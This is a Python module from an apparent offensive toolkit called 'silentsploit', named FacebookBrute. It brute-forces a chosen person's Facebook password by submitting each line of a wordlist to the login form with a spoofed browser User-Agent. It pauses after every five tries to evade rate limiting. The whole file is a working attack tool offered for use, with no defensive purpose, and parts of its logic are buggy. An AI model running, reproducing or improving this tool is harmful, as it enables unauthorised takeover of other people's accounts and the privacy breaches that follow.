#!/usr/bin/env python2
#! -*- coding: UTF-8 -*-
import os, sys, cfscrape, urllib3
import json
import time
import requests as reqs
from bs4 import BeautifulSoup
from silentsploit.core.modules import *
from silentsploit.utils import *

# Mechanize is obligatory
try:
   import mechanize
except ImportError:
   os.system("pip install mechanize")
   
   
class Exploit(Exploit):
   __info__ = {
       "Name": "FacebookBrute",
       "Version": "v0.1",
       "Authors":  
                (
                   "Mr-Z3r0",     # Team Manager && Creator
                   "TheDeathWing" # Our Team
                ),
       "Description": "Facebook account Brute Force",
       "LastModified": "13-02-2020"
   } 
   wordlist = OptFile("", "Insert you passwordlist")
   user_id = OptString("", "Insert Target USER id or emaill")
   def run(self):
       global browser
       global URL
       URL = "https://facebook.com/login.php"
       headers = {
           'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
       }
       browser = mechanize.Browser()
       browser.addheaders = [('User-Agent',headers['User-Agent'])]
       browser.set_handle_robots(False)
       try: 
         self.file = open(self.wordlist, 'r')
       except IOError:
          print_error("Wordlist not found")
       self.check()
   def check(self):
      i = 0
      test = 0
      value = 5
      while self.file:
        passw = self.file.readline().strip()
        i+=1
        if len(passw) < 6:
          continue
        print(str(1) + ":", passw)
        response = browser.open(URL)
        try:
              if response.code == 200:
                   browser.select_form(nr=0)
                   browser.form['email'] = self.user_id
                   browser.form['pass'] = passw
                   response = browser.submit()
                   if sys.argv[3] in response.read(): 
                        print('The password is : '+  str(passw))
                        break
              test +=1
              if test == value:
                   print_warning("\nSleeping for time: 1min\n12m\n\n")
                   time.sleep(60)
                   value +=5
        except Exception as erro:
           print_error(erro)
           break